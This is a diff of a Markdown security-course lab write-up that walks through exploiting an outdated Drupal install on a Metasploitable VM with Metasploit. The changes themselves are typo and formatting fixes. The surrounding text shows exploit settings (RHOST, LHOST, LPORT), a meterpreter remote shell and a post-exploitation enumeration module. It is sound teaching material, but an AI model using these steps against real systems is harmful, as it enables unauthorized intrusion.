@@ -167,7 +167,7 @@ Remote shell on the vulnerable instance using SQL injection by uploading a malic
 form to Drupal's cache.
 
 ### drupal_coder_exec
-**Date** 
+**Date**   
 2016-07-13
 
 **Exploit effect**  
@@ -217,7 +217,7 @@ Exploit target:
 
 ````
 
-Now lets set the options. RPORT, LHOST and LPORT looks fine as they are by default, so they wont be touched.
+Now let's set the options. RPORT, LHOST and LPORT looks fine as they are by default, so they won't be touched.
 ```console
 msf > set RHOST 10.0.2.4
 msf > set TARGETURI /drupal/
@@ -260,15 +260,15 @@ Mode              Size   Type  Last modified              Name
 We are in!
 
 # Post-Exploitation
-When you do have the meterpreter session, you can use the help command to see the
+**When you do have the meterpreter session, you can use the help command to see the
 commands that you can run. Alternatively, you can run metasploits “post” modules to
 execute additional functions. Post modules are used to execute further commands when
 you have gained access into the system (which you have done). To see post modules for
 linux you need to open a separate terminal and start metasploit again. At the “msf6>” prompt, you can then just enter “search post/linux”. For Windows you would search
-“post/windows/”
+“post/windows/”**
 
-What I would like you do to is to run a module that will give you system and user
-information. Here it is.
+**What I would like you do to is to run a module that will give you system and user
+information. Here it is.**
 
 `meterpreter > run post/linux/gather/enum_system`
 
@@ -366,7 +366,7 @@ exploits?**
 Its using a very old version of the Drupal service which is vulnerable to multiple exploits hereby SQLi.
 
 **†When opening the drupal web page, you are greeted by a warning. Do you think this is good practice? Why or why not?**  
-Its definitely not a good practise to show error and rebug messages in production. These errors can make it easier for attackers to exploit and gather sensitive information about the application.
+It’s definitely not a good practice to show error and debug messages in production. These errors can make it easier for attackers to exploit and gather sensitive information about the application.
 
 **†Given a more restrictive web server configuration, finding the relevant information wouldn’t have been that easy. Please check dirbuster, to be found in the “Web Application Analysis” menu. How could this tool help you finding information? Try it out on the Ubuntu metasploitable VM. Use `/usr/share/dirbuster/wordlists directorylist-2.3-medium.txt as dictionary`.**  
 ```console
